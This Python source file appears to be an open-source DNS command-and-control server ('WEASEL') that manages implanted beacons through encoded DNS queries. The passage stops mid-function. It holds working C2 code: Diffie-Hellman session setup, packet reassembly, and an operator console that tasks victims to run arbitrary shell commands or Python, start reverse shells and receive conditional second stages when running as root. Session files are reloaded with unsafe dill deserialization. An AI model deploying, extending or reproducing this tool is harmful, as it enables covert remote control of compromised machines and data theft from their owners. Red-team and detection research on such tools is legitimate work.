#!/usr/bin/env python3
'''
Copyright (c) Facebook, Inc. and its affiliates.

This source code is licensed under the MIT license found in the
LICENSE file in the root directory of this source tree.
'''
import base64, binascii, builtins, cmd, dill, logging, os, readline, resource, signal, socket, sys, time
from pprint import pprint
from random import randint
from tabulate import tabulate
from threading import Lock, Timer

from cryptography import utils
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from dnslib import A, AAAA, NS, SOA, QTYPE, RCODE, RR, DNSError
from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer

'''Configurable.'''
ADDR = "0.0.0.0"
PORT = 53
TTL = 120
STATIC_RECORDS = [
    {"type": "SOA", "question": "example.org", "answer": SOA("ns.example.org", "admin.example.org", (2019010101, 60, 60, 60, 30))},
    {"type": "NS", "question": "example.org", "answer": NS("ns.example.org")},
    {"type": "A", "question": "ns.example.org", "answer": A("12.34.56.78")},
    {"type": "AAAA", "question": "example.org", "answer": AAAA("::FFFF:0001:0002")},
]

'''Debugs. Each level is dependent on the previous being enabled.

DEBUG: Be noisy in logs/output. Prints what the server is doing as it receives packets.
DEBUG_DNS: Log all the network activity done by dnslib. Prints incoming DNS packets not processed by the server.
DEBUG_DNS_BYTES: Log the raw bytes on the wire.
'''
DEBUG = True
DEBUG_DNS = False
DEBUG_DNS_BYTES = False


'''Non configurable. Version data.'''
VERSION = 1
NON_DATA_PREAMBLE = 'ph'

'''Non configurable. Globals.'''
# Sessions is a map of session IDs to lists of active streams
# for that session. A session is established when a client
# initiates a connection and a Diffie-Hellman key exchange
# establishes an AES session key. This server then provides
# the client with a session cookie (aka session ID) which the
# client sends with every packet, allowing the server to
# use the correct AES key to decrypt the packet data.
#
# An active stream is a list of packets which have yet to be
# reassembled into a message. Reassembly occurs when all
# packets in a message are received. Each data packet contains
# its own sequence number and the number of total packets in
# that msg.
#
# Note that data packets are distinct from non-data packets
# which are used in the initial Diffie-Hellman exchange.
# Non-data packets' sequence and total counters are incremented
# on a distinct non-hex preamble instead of using [a-f0-9].
#
# sessions = {  "<session_id>": {
#                   "key": <key>, "iv": <iv>, "interval": <seconds>, "last_seen": <timestamp>, "waiting": <flag>
#                   "version": <version>, "info": INFO, "outbound_queue": QUEUE, "streams": STREAMS
#                   },
#            ... }
# INFO = {"hostname": <hostname>, "kernel": <kernel_version>, "uid": <client_uid>, "source_ip": <client_ip>}
# QUEUE = {"<task_id>": <data>, ...}
# STREAMS = {"<stream_id>": STREAM, ...}
# STREAM = {"total_pkts": <total>, "pkts": [PKT, ...], "expiry": "<timestamp>"}
# PKT = "<data>"
# TODO: make sessions into a proper Class, with:
#   new() for instantiating a new session
#   exists() for checking if a session exists
#   tabulate() that returns a tabulate() object ready for printing
#   each function (shell, network info, callback interval) should be methods that the CLI (MainMenu) calls
sessions = {}

# meta is a non-session object.
#
# Autotask can be either task data (autotask_is_script == False)
# or Python code to execute (autotask_is_script == True).
#
# If it is task data, that data is sent automatically to every new
# beacon after a session has been established. So the data should
# be in a format that beacon expects, like '<function_id>|<args>'.
#
# If it is Python code, the code will be called like 'autotask(session)'
# after a session has been established, where the 'session' arg is
# sessions[session_id] object. Whatever the code returns will be
# sent to the beacon. For more information see do_autotask() and respond().
meta = {"autotask": None, "autotask_is_script": False}

# A listing of functions and their IDs, descriptions, and args they accept sorted by client version.
CLIENT_INFO = {
    'v1': [
        ['2', 'Die.', ''],
        ['4', 'Reconnect, rekey and create a new session', ''],
        ['5', 'Set callback interval', 'num_seconds'],
        ['6', 'Get network interface information', ''],
        ['8', 'Eval arbitrary Python3 code and return first 400 bytes of stdout, or the first exception', 'python3 oneliner'],
        ['80', 'Eval arbitrary Python3 code and return the name of the first exception or 0', 'python3 oneliner'],
        ['9', 'Execute arbitrary command and return first 400 bytes of stdout/stderr (sync, waits for command to exit)', 'command with args'],
        ['90', 'Execute arbitrary command and return nothing (async, does not wait for command to exit)', 'command with args'],
    ]
}

pkt_handler = None
dns_server = None
sessions_lock = Lock()
sessions_filename = 'WEASEL.pkl'

# TODO: relying on `while sessions_lock.locked(): time.sleep(0.001)` before
# executing a function that modifies the global sessions object in order to
# ensure save and restore (write/read sessions to/from disk) functions run
# reliably is a horrible thing, because between the time the .locked() check
# executes and the sessions object is modified save/restore can acquire the
# lock and start messing with sessions but, oh well. This is a stopgap because
# I can't figure out how to have only save/restore be able to acquire an
# exclusive lock against al the other functions. Ideally I need 3 parties to
# the lock: save, restore, and everyone else.

def main():
    global pkt_handler
    global dns_server

    signal.signal(signal.SIGTERM, exit_handler)

    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)-7s - %(threadName)-12s (%(module)-6s.%(funcName)s:%(lineno)d) - %(message)s')
    if DEBUG:
        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG)

    dns_logger = LocalDNSLogger()
    pkt_handler = PacketHandler()
    resolver = BeaconResolver()
    dns_server = DNSServer(resolver, port=PORT, address=ADDR, logger=dns_logger)
    dns_server.start_thread()

    ui = MainMenu()
    ui.cmdloop()

    logging.warning("After cmdloop initialized. Code shouldn't get here so long as MainMenu is running.")
    while dns_server.isAlive():
        time.sleep(1)


def save_sessions(filename):
    global sessions_lock
    global sessions_filename

    if not filename:
        print('[Error] Save needs a filename.')
        return

    sessions_filename = filename

    logging.debug('Attempting to save sessions to %s. Acquiring lock.', filename)
    with sessions_lock:
        try:
            with open(filename, 'wb') as f:
                logging.debug('Lock acquired, writing to %s.', filename)
                dill.dump(sessions, f)
        except OSError as e:
            print('[Error] Saving to file', filename, 'failed.')
            print('[Exception]', e)
            return


    logging.debug('Sessions saved to', filename)


def restore_sessions(filename):
    global sessions
    global sessions_lock

    if not filename:
        print('[Error] Restore needs a filename.')
        return

    logging.debug('Attempting to restore sessions from %s. Acquiring lock.', filename)
    with sessions_lock:
        try:
            with open(filename, 'rb') as f:
                logging.debug('Lock acquired, restoring from %s.', filename)
                sessions = {**sessions, **dill.load(f)}
        except FileNotFoundError:
            print('[Error] File', filename, 'does not exist. Did not restore.')
            return
        except OSError as e:
            print('[Error] Restoring from file', filename, 'failed.')
            print('[Exception]', e)
            return
        except KeyError as e:
            print("[Error] The saved object is not compatible with this 'sessions' object. Perhaps it is from another version?")
            print('[Exception]', e)

    print('Sessions restored from', filename)


class MainMenu(cmd.Cmd):
    '''The primary CLI user interface.
    This runs in the main thread and is started by calling cmdloop() on an instance of this class.
    It should never return while the program is running.'''

    def __init__(self):
        super(MainMenu, self).__init__()

        self.intro = "DNS beacon server. Try `help`. You can also `restore` an old session from disk."
        self.prompt = "(WEASEL) > "
        self.doc_header = 'Available commands (server v' + str(VERSION) +')'
        self.do_help.__func__.__doc__ = 'List available commands with "help" or detailed help with "help cmd". Aliases: h, ?'

        self.do_save.__func__.__doc__ = self.do_save.__doc__ + sessions_filename
        self.do_restore.__func__.__doc__ = self.do_restore.__doc__ + sessions_filename
        self.do_autosave.__func__.__doc__ = self.do_autosave.__doc__ + sessions_filename

        self.autosave_timer = None
        self.autosave_interval = None

        self.aliases =  {'h'    : self.do_help,
                         'ls'   : self.do_sessions,
                         'list' : self.do_sessions,
                         'session' : self.do_sessions,
                         'q'    : self.do_queue,
                         'i'    : self.do_info,
                         'time' : self.do_now,
                         'clock': self.do_now,
                         'date' : self.do_now,
                         'quit' : self.do_exit}

    def _autosave_sessions(self, filename=sessions_filename, interval=10 * 60):
        save_sessions(filename)

        self.autosave_timer = Timer(interval, self._autosave_sessions, None,
                                    {'filename': filename, 'interval': interval})
        self.autosave_timer.daemon = True
        self.autosave_timer.start()

    def _print_autotask(self):
        if not meta['autotask']:
            print('No autotask is set.')
        else:
            if meta['autotask_is_script']:
                print('Current autotask script:', meta['autotask'])
            else:
                print('Current autotask data:', meta['autotask'])

    def cmdloop(self, intro=None):
        '''Overload cmdloop to neuter CTRL+C behavior and cause it to print ^C on a newline instead of quitting.'''
        print(self.intro)
        while True:
            try:
                super(MainMenu, self).cmdloop(intro="")
                break
            except KeyboardInterrupt:
                print('^C')

    def default(self, line):
        '''Set up command aliases.'''
        cmd, arg, line = self.parseline(line)
        if cmd in self.aliases:
            self.aliases[cmd](arg)

    def emptyline(self):
        '''By default, sending Cmd and empty line of input (hitting return at a blank prompt) repeats the last command.
        We don't want that.'''
        pass

    def do_exit(self, line):
        '''Usage: exit
        Quit the server process. Does not terminate clients.
        '''
        raise SystemExit

    def do_sessions(self, line):
        '''Usage: sessions|list|ls [-c N] [session_id ...]
        Print client sessions. An * by Last Seen indicates we're waiting on a synchronous task.
        Filter on number of checkins with -c and/or a space delimited list of session_ids.
        '''

        # Extract just the relevant data into a list of lists for printing in a table.
        # data = [ [session_id, hostname, uid, kernel, version, interval, last_seen+waiting], [session_id, ...] ]
        if line:
            # Filters
            arg = line.split()[0]
            if arg == '-c':
                # Filtering on number of checkins
                try:
                    checkins = int(line.split()[1])
                except IndexError:
                    print(self.do_sessions.__doc__)
                    return
                except ValueError:
                    print('Number of checkins must be a digit, for example: -c 2')
                    return

                try:
                    # If session_ids are also given, filter those too
                    ids = line.split(maxsplit=2)[2]

                    data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                             sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                             sessions[session_id]['version'], sessions[session_id]['interval'],
                             time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                             sessions[session_id]['checkins']]
                            for session_id in
                            set([requested_id for requested_id in ids.split() if requested_id in sessions.keys() if sessions[requested_id]['checkins'] >= checkins])]
                except IndexError:
                    # If no session_ids are given, filter only on checkins
                    data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                             sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                             sessions[session_id]['version'], sessions[session_id]['interval'],
                             time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                             sessions[session_id]['checkins']]
                            for session_id in sessions if sessions[session_id]['checkins'] >= checkins]
            else:
                # Filtering on session_ids
                data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                         sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                         sessions[session_id]['version'], sessions[session_id]['interval'],
                         time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                         sessions[session_id]['checkins']]
                        for session_id in set([requested_id for requested_id in line.split() if requested_id in sessions.keys()])]
        else:
            # No filters, get all sessions
            data = [[session_id, sessions[session_id]['info']['hostname'], sessions[session_id]['info']['uid'],
                     sessions[session_id]['info']['source_ip'], sessions[session_id]['info']['kernel'],
                     sessions[session_id]['version'], sessions[session_id]['interval'],
                     time.ctime(sessions[session_id]['last_seen']) if sessions[session_id]['last_seen'] else '' + sessions[session_id]['waiting'],
                     sessions[session_id]['checkins']]
                    for session_id in sessions]

        headers = ['Session', 'Hostname', 'UID', 'Last Source IP', 'Kernel', 'Client Ver', 'Interval (sec)',
                   'Last Seen (' + time.strftime('%z') + ' ' + time.tzname[time.daylight] + ')', 'Checkins']

        print(tabulate(data, headers=headers, disable_numparse=True))

    def do_kill(self, line):
        '''Usage: kill session_id [session_id ...]
        Ask sessions to die. Next time beacon checks in, it will kill itself.
        This server forgets about the session once the beacon has checked in for the last time.
        '''
        if not line:
            print('[Error] Kill needs at least 1 session.')
            return

        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        # Only add to the outbound_queue of existing sessions.
        args = line.split()
        for session in [session for session in sessions if session in args]:
            sessions[session]['outbound_queue'][str(time.time())] = '2|'
            print('Tasked', session, 'to die.')

    def do_delete(self, line):
        '''Usage: delete session_id [session_id ...]
        Remove a session from the list. This does not ask it to die first,
        so if this is a beacon it will continue trying to check in.
        Use this to remove pollution: dead beacons, or non-beacon DNS requests that have made it through.'''
        if not line:
            print('[Error] Delete needs at least 1 session.')
            return

        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        args = line.split()
        for arg in args:
            try:
                del sessions[arg]
                print('[!] No longer tracking', arg)
            except:
                pass

    def do_queue(self, line):
        '''Usage: queue|q [session_id]
        Print queued tasks for all clients or for a specific session.'''
        if line:
            arg = line.split()[0]
            try:
                data = [[arg, sessions[arg]['outbound_queue']]]
            except KeyError:
                print('[Error] Session', arg, 'does not exist.')
                return
        else:
            data = [[session_id, sessions[session_id]['outbound_queue']] for session_id in sessions]

        headers = ['Session', 'Queued Tasks']
        print(tabulate(data, headers=headers, disable_numparse=True))

    def do_cancel(self, line):
        '''Usage: cancel task_id [task_id ...]
        Remove tasks from queue, preventing them from being sent to the client next time it checks in.
        List queued tasks with `queue`.'''
        if not line:
            print('[Error] Cancel needs at least 1 task.')
            return

        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        args = line.split()
        for session in sessions:
            for task in args:
                try:
                    del sessions[session]['outbound_queue'][task]
                    print(task, 'cancelled for client', session)
                except KeyError:
                    pass

    def do_interval(self, line):
        '''Usage: interval session_id seconds
        Set the callback interval for the client to given seconds.'''
        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        try:
            session, seconds = line.split()[:2]
            if seconds.isdigit():
                sessions[session]['outbound_queue'][str(time.time())] = '5|' + seconds
                sessions[session]['interval'] = sessions[session]['interval'] + ' (next: ' + seconds + ')'
                print('Interval of', seconds, 'seconds set for session', session)
            else:
                print('[Error] Seconds must only contain digits.')
                return
        except ValueError:
            print('[Error] Interval needs 2 arguments: a session_id and the number of seconds to set the callback interval to.')
        except KeyError:
            print('[Error] Session does not exist.')
        except TypeError:
            print('[Error] Wait for the session to check in once before setting the interval.')

    def do_function(self, line):
        '''Usage: function session_id function_id [args]
        Have a client run the given function with arguments (may be optional depending on function).
        Use `info` to get a list of available functions for a given client.'''
        try:
            session, function = line.split()[:2]
            if function.isdigit():
                global sessions
                while sessions_lock.locked(): time.sleep(0.001)

                # Anything passed after the 2nd argument is sent as-is to the client function
                try:
                    args = line.split(maxsplit=2)[2]
                except IndexError:
                    args = ''

                # Due to packetization restrictions (sequence numbers) we can't send messages
                # over 800 bytes. We're limiting them to 666 bytes here just in case there are
                # unaccounted things or my math was wrong.
                if len(args) > 666:
                    print('[Error] Function arguments cannot be longer than 666 bytes. Run was not tasked.')
                    return

                sessions[session]['outbound_queue'][str(time.time())] = function + '|' + args
                print('Session', session, 'was tasked.')
            else:
                print('[Error] Function_id must only contain digits.')
                return
        except ValueError:
            print('[Error] Run needs minimum 2 arguments: a session_id and the function_id to task.')
        except KeyError:
            print('[Error] Session or function is invalid.')
            print('        Check the available `sessions` and see which functions are available with `info`.')

    def do_shell(self, line):
        '''Usage: shell session_id shell_command
        Have a client run the given command in a shell (likely /bin/bash, but depends on OS).
        Synchronous. The client will wait for command to return before it will check in again. Shell output is returned.
        Do not use for long running processes where you want the beacon to continue being available.'''
        try:
            session, command = line.split(maxsplit=1)

            global sessions
            while sessions_lock.locked(): time.sleep(0.001)

            # Due to packetization restrictions (sequence numbers) we can't send messages
            # over 800 bytes. We're limiting them to 666 bytes here just in case there are
            # unaccounted things or my math was wrong.
            if len(command) > 666:
                print('[Error] Command cannot be longer than 666 bytes. Shell was not tasked.')
                return

            version = sessions[session]['version']
            if version == '1':
                function = '9'
            else:
                print('[Error] Session', session, 'is version', version, "and I don't know what function number to use for shell. Shell was not tasked.")
                return

            # TODO: 'waiting' flag is currently '' (False) or ' *' (True) and
            # printed as-is in sessions/ls output.  In the future, it should be
            # a lot nicer. Shell (and other client functions) should be a
            # proper method which is defined per client version (which should
            # be a class) and can set flags and handle stuff as needed, instead
            # of there being a bunch of if statements in these CLI methods.
            sessions[session]['outbound_queue'][str(time.time())] = function + '|' + command
            sessions[session]['waiting'] = ' *'
            print('Session', session, 'was tasked.')
        except ValueError:
            print('[Error] Shell needs minimum 2 arguments: a session_id and the command to run.')
        except KeyError:
            print('[Error] Session is invalid.')
            print('        Check the available `sessions`.')

    def do_shellasync(self, line):
        '''Usage: shellasync session_id shell_command
        Have a client run the given command in a shell (likely /bin/bash, but depends on OS).
        Asynchronous. Beacon will execute the command and return immediately. Shell output is not returned.
        Use for long running processes like interactive reverse shells.'''
        try:
            session, command = line.split(maxsplit=1)

            global sessions
            while sessions_lock.locked(): time.sleep(0.001)

            # Due to packetization restrictions (sequence numbers) we can't send messages
            # over 800 bytes. We're limiting them to 666 bytes here just in case there are
            # unaccounted things or my math was wrong.
            if len(command) > 666:
                print('[Error] Command cannot be longer than 666 bytes. Shellasync was not tasked.')
                return

            version = sessions[session]['version']
            if version == '1':
                function = '90'
            else:
                print('[Error] Session', session, 'is version', version, "and I don't know what function number to use for shellasync. Shellasync was not tasked.")
                return

            sessions[session]['outbound_queue'][str(time.time())] = function + '|' + command
            print('Session', session, 'was tasked.')
        except ValueError:
            print('[Error] Shellasync needs minimum 2 arguments: a session_id and the command to run.')
        except KeyError:
            print('[Error] Session is invalid.')
            print('        Check the available `sessions`.')

    def do_autotask(self, line):
        '''Usage:
autotask
        Display current autotask setting.
autotask -d
        Disable autotasking.
autotask data
        Send raw data. Data should be in a format beacon expects, like <function_id>|<args>.
autotask -s python_lambda
        Send the return of python_lambda.
        Available in your lambda: session (dict, current session), sessions (dict, all sessions), session_id (string).
        Useful for conditional tasking, example: autotask -s '90|stage2' if int(session['info']['uid']) == 0 else '2|'

Autotask does one of the above for every new beacon after it has established a session.
It is only run once at the start of a session, not on every checkin.'''
        global meta

        if not line:
            self._print_autotask()
            return

        else:
            arg = line.split()[0]
            if arg == '-d':
                meta['autotask_is_script'] = False
                meta['autotask'] = None
            elif arg == '-s':
                meta['autotask_is_script'] = True
                meta['autotask'] = line.split(maxsplit=1)[1]
            else:
                meta['autotask_is_script'] = False
                meta['autotask'] = line

        self._print_autotask()

    def do_info(self, line):
        '''Usage: info|i [session_id | version | -d]
        Without argument: print server stats. In DEBUG (or with -d) this dumps the sessions object.
        With argument: print functions for the client version. Version numbers start with 'v'.'''
        if line:
            arg = line.split()[0]
            if arg[0] == 'v':
                client_ver = arg
            elif arg == '-d':
                print('Sessions object:')
                pprint(sessions)
                return
            else:
                try:
                    client_ver = 'v' + sessions[arg]['version']
                except KeyError:
                    print('[Error] Session', arg, "does not exist or I don't know what version it is (hasn't checked in yet).")
                    return

            try:
                if arg[0] != 'v' and arg != '-d':
                    self.do_sessions(arg)

                data = CLIENT_INFO[client_ver]
                headers = ['Function', 'Description', 'Args']

                print('\nClient version', client_ver, '\n')
                print(tabulate(data, headers=headers, disable_numparse=True))
            except KeyError:
                print('[Error] Client version', client_ver, 'does not exist.')
        else:
            last, last_at = None, 0
            for session in sessions:
                if sessions[session]['last_seen'] and sessions[session]['last_seen'] > last_at:
                    last = session
                    last_at = sessions[session]['last_seen']

            print(len(sessions), 'active sessions.')
            if last:
                print('Last client seen:', last, 'at', last_at)
            else:
                print('No clients checked in yet.')

            if self.autosave_timer:
                print('Autosave enabled: every', self.autosave_interval, 'seconds to file', sessions_filename)
            else:
                print('Autosave disabled.')

            try:
                print('Memory usage (resident page size):', "{:,}".format(resource.getrusage(resource.RUSAGE_SELF).ru_maxrss), 'KB')
            except:
                pass

            if DEBUG:
                print('\nsessions object:')
                pprint(sessions)

    def do_now(self, line):
        '''Usage: now|clock|time|date
        Print the current time.'''
        print(time.ctime())

    def do_save(self, line):
        '''Usage: save [filename]
        Persists the sessions object from memory to disk.
        Default filename: '''
        if line:
            save_sessions(line.split()[0])
        else:
            save_sessions(sessions_filename)

    def do_restore(self, line):
        '''Usage: restore [filename]
        Restores a saved sessions object from disk and merges it with the current sessions object in memory.
        Default filename: '''
        if line:
            restore_sessions(line.split()[0])
        else:
            restore_sessions(sessions_filename)

    def do_autosave(self, line):
        '''Usage: autosave [filename] [interval]
        Automatically save sessions every `interval` seconds to `filename`.
        Default interval: 10 minutes. Default filename: '''
        global sessions_filename

        if self.autosave_timer:
            print('[Error] Autosave already enabled for file', sessions_filename, '. Use `autosave_cancel` before enabling autosave again.')
            return

        interval = 10 * 60

        if line:
            args = line.split()[:2]
            sessions_filename = args[0]
            try:
                interval = int(args[1])
            except:
                logging.debug('Either the given interval was not an int, or no interval was given. Defaulting to 10 minutes.')

        self.do_save.__func__.__doc__ = self.do_save.__doc__.rpartition('\n')[0] + '\nDefault filename: ' + sessions_filename
        self.do_restore.__func__.__doc__ = self.do_restore.__doc__.rpartition('\n')[0] + '\nDefault filename: ' + sessions_filename
        self.do_autosave.__func__.__doc__ = self.do_autosave.__doc__.rpartition('\n')[0] + '\nDefault interval: 10 minutes. Default filename: ' + sessions_filename

        print('Autosave enabled: every', interval, 'seconds to file', sessions_filename)
        self._autosave_sessions(sessions_filename, interval)
        self.autosave_interval = interval

    def do_autosave_cancel(self, line):
        '''Usage: autosave_cancel
        Stops autosaving.'''
        if self.autosave_timer:
            self.autosave_timer.cancel()
            print('Autosave disabled.')
            self.autosave_timer = None
        else:
            print('Autosave not enabled. Nothing to do.')


class BeaconResolver(BaseResolver):
    '''Incoming DNS requests are passed to this resolver, which overloads dnsslib.BaseResolver.

    Packets are sent to a global PacketHandler instance which does the heavy lifting of figuring
    out what the incoming data is, reassembling packets, and optionally returning a response.

    Responses are crafted and sent back to the initiating client in resolve().

    Client session initializations (crypto) takes place in resolve().
    Data packet (non crypto) responses are provided by PacketHandler.'''

    def resolve(self, request, handler):
        reply = request.reply()
        source_ip = handler.client_address[0]

        # If a static record exists for this query, respond and stop processing.
        try:
            # First check if we have any records for this name
            static_answers = [record for record in STATIC_RECORDS if str(request.q.qname)[:-1] == record['question']]

            if static_answers:
                logging.debug('Static resolver: have domain <%s>. Checking we have an answer for this type <%s>.', request.q.qname, QTYPE[request.q.qtype])

                # Next check if we have any records of the requested type for this name
                # If there is no match, this will throw an IndexError
                static_answer = [record for record in static_answers if record['type'] == QTYPE[request.q.qtype]][0]

                logging.debug('Static resolver: have answer.')
                reply.add_answer(RR(static_answer['question'], QTYPE.reverse[static_answer['type']], ttl=60, rdata=static_answer['answer']))

                if static_answer['type'] in ['NS', 'SOA']:
                    logging.debug('Static resolver: client is asking for NS or SOA. If we have an NS answer, it will be an additional record.')
                    additional_answer = [record for record in STATIC_RECORDS if 'ns.'+static_answer['question'] in record['question'] if record['type'] == 'A'][0]
                    if additional_answer:
                        logging.debug('Static resolver: added additional record.')
                        reply.add_ar(RR(additional_answer['question'], QTYPE.reverse[additional_answer['type']], ttl=60, rdata=additional_answer['answer']))

                return reply
        except IndexError:
            # If we have the requested name but not the requested type (MX, A, AAAA, ...) return empty reply
            # NXDomain here would cause the client to think we don't have the requested name in any form
            logging.debug('Static resolver: have domain, but type mismatch. Sending empty reply.')
            return reply

        try:
            msg, domain, response = pkt_handler.decode_dns_msg(request.q, source_ip)
        except (SyntaxError, IndexError):
            # The session cookie received in the message does not exist
            # on the server. Client must reinitialize.
            # Also triggers if we're receiving non-c2 traffic to our resolver.
            # Send an NXDOMAIN or something
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        if msg is not None:
            # This is a Diffie-Hellman exchange
            # We are initializing a new client session
            if (
                isinstance(msg, dict) and 'B' in msg.keys() and 'iv' in msg.keys()
            ):
                # Diffie-Hellman Ephemeral (DHE) setup
                # RFC 3526 "group 1" (group 5 truncated)
                g = 2
                p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74
                a = randint(1, p - 1)
                public = pow(g, a, p)

                # Reply with the server's public key so client
                # can compute the AES session key themselves
                data = utils.int_to_bytes(public)

                # AES session key computed
                key = pow(msg["B"], a, p)

                # New session cookie the client should use going forward
                new_session = pkt_handler.create_new_session(request.q, key, msg["iv"], source_ip)

                # Encode the session cookie as an IP address
                # The client will make a v4/A request and expect the client
                # cookie in return
                #
                # NOTE: This code is not used, the client will only make
                # AAAA requests because getaddrinfo() is dumb and refuses
                # to accept mixed results: if the query is for an A it will
                # only return A answers, likewise for AAAA. It will not
                # return A and AAAA at the same time, except under some
                # hard to pin down race condition when calling it using
                # AF_UNSPEC and AI_ALL | AI_V4MAPPED. It's a mess.
                if QTYPE.A == request.q.qtype:
                    ip = socket.inet_ntop(socket.AF_INET, new_session.encode())

                    reply.add_answer(RR(request.q.qname, QTYPE.A,
                                        ttl=TTL, rdata=A(ip)))

                # Encode the session cookie as the first 4 bytes of an IPv6
                # address, and pad the rest of the address with 12 \x00 bytes.
                #
                # Encode the public key as two IPv6 addresses
                #
                # The client will make a v6/AAAA request and expect a session
                # cookie and the server's public key in return.
                elif QTYPE.AAAA == request.q.qtype:
                    new_session = new_session.encode() + b'\x00' * 12
                    ip = socket.inet_ntop(socket.AF_INET6, new_session)

                    reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
                                        ttl=TTL, rdata=AAAA(ip)))

                    logging.debug("Server public key for this session: %s", public)
                    public_bytes = utils.int_to_bytes(public)

                    packets = pkt_handler.packetize_response(public_bytes)

                    if packets:
                        logging.debug("Packets for DNS response assembly: %s", packets)
                        for pkt in packets:
                            ip = socket.inet_ntop(socket.AF_INET6, pkt)
                            reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
                                                ttl=TTL, rdata=AAAA(ip)))

                # ???? Should never get here.
                else:
                    reply.header.rcode = RCODE.NXDOMAIN

            # It's a data message, parse and respond in kind.
            else:
                if response:
                    logging.debug("Packets for DNS response assembly: %s", response)
                    for pkt in response:
                        ip = socket.inet_ntop(socket.AF_INET6, pkt)
                        reply.add_answer(RR(request.q.qname, QTYPE.AAAA,
                                            ttl=TTL, rdata=AAAA(ip)))

            logging.debug("Request message from client: %s", msg)
        else:
            # Say thanks with NODATA (no error code or answer records)
            return reply

            # Alternatively, ignore the repeat requests. This causes the
            # client to retry until it times out on their end, which gets
            # noisy and slows down communications (since we'll otherwise
            # only reply once we have all packets in a message).
            raise DNSError("Already have this packet or the stream is expired, dropping it.")
            return None

        logging.debug("Replying with:\n%s", reply)
        return reply


class PacketHandler(DNSHandler):
    '''BeaconResolver leverages PacketHandler to decode incoming DNS packets,
    reassemble incoming packets into a complete message, determine the correct
    response, craft the response, and return it so BeaconResolver can send it
    to the initiating client.

    There should be a single global PacketHandler instance.'''

    def __init__(self):
        self.cleanup_timer = None
        self.cleanup_expired_streams()

    def decode_dns_msg(self, query, source_ip):
        global sessions
        while sessions_lock.locked(): time.sleep(0.001)

        # Extract queried hostname as a string without trailing dot.
        query = str(query.qname)[:-1]
        fields = query.split('.')

        # Sanity check.
        # If all the fields aren't there we won't be able to decode the packet.
        if len(fields) < 5:
            logging.debug("Received a non-beacon packet.")
            raise SyntaxError("Not a beacon packet.")

        # Packet format: <preamble><data>.<stream>.<session>.hostname.tld
        #   First 2 bytes of the first subdomain is the preamble
        #   The rest of the first subdomain is encrypted data
        #   The second subdomain is the stream ID
        #   The third subdomain is the session cookie
        data = fields[0]
        stream = fields[1]      # beacon v1 uses a 2 byte stream ID
        session = fields[2]     # beacon v1 uses a 4 byte session ID
        domain = fields[3:]
        domain = ".".join(domain)

        preamble = data[:2]
        data = data[2:]         # beacon v1 supports 1-50 bytes of data

        msg, response = None, None

        if (len(stream) != 2) or (len(session) != 4):
            logging.debug("Received a non-beacon packet.")
            raise SyntaxError("Not a beacon packet.")


        # The first byte of preamble is that packet's sequence number
        # The second byte of preamble is the total number of pkts
        # So pkt[0] & pkt[1] tells the server how to reassemble
        # To make this *slightly* less obvious on the wire, 
        # the digits are inverted (0=f, 1=e, ...).
        #
        # However non-data packets use the NON_DATA_PREAMBLE as
        # a base. The NON_DATA_PREAMBLE characters are incremented
        # to encode seq/total information. NON_DATA_PREAMBLE
        # must be carefully chosen because of this: each char
        # cannot be greater than 'k' because 'k' + 15 = 'z' and
        # beyond that we have non-DNS characters.
        try:
            if ord(preamble[0]) >= ord(NON_DATA_PREAMBLE[0]):
                is_data = False

                seq = abs(ord(NON_DATA_PREAMBLE[0]) - ord(preamble[0]))
                total = abs(ord(NON_DATA_PREAMBLE[1]) - ord(preamble[1]))
            else:
                is_data = True

                seq = abs(int(preamble[0], 16) - 15)
                total = abs(int(preamble[1], 16) - 15)
        except:
            logging.debug("Error decoding preamble [%s] - probably not a beacon packet.", preamble)
            raise SyntaxError("Not a beacon packet.")

        logging.debug("Incoming [%s/%s] ( %s - %s ) %s", seq + 1, total, stream, session, data)

        # If the stream isn't completed and processed in 5 minutes, delete it.
        default_expiry = int(time.time()) + 300

        if is_data:
            logging.debug("Data received")
            # If this is data we should have an established session.
            # If we don't, something's wrong, send back an error.
            if session not in sessions:
                raise IndexError('No session for data message. Client must reinitialize.')

            # Existing session, existing stream
            if stream in sessions[session]["streams"]:
                logging.debug("Existing stream")
                # Stream is expired, stop parsing this packet
                if (
                    sessions[session]["streams"][stream]["expiry"] and
                    int(time.time()) > sessions[session]["streams"][stream]["expiry"]
                ):
                    logging.debug("Expired stream!")
                    return msg, domain, response

                # Stream is not expired (not yet responded to)
                # It will get processed in the code outside this if
                else:
                    pass

            # Existing session, new stream
            else:
                logging.debug("New stream")
                sessions[session]["streams"][stream] = {"total_pkts": total,
                                                        "pkts": [None] * total, "expiry": default_expiry}

            try:
                if data in sessions[session]["streams"][stream]["pkts"]:
                    logging.debug("Already have this packet")
                    # We already have this packet, ignore it
                    return msg, domain, response

                # We don't have the packet yet, store it in memory.
                sessions[session]["streams"][stream]["pkts"][seq] = data
                logging.debug("New packet stored")
            except KeyError:
                # The stream must have been deleted by another thread
                logging.exception("Stream must have been deleted elsewhere - it's ok, this is non-fatal")
                pass

        # Non-data packets indicate we are in a Diffie-Hellman
        # exchange, where the client sends us a random session ID
        # that we'll use to track this DH conversation. Once DH
        # is complete, we'll issue a session cookie and delete
        # the client-provided session ID.
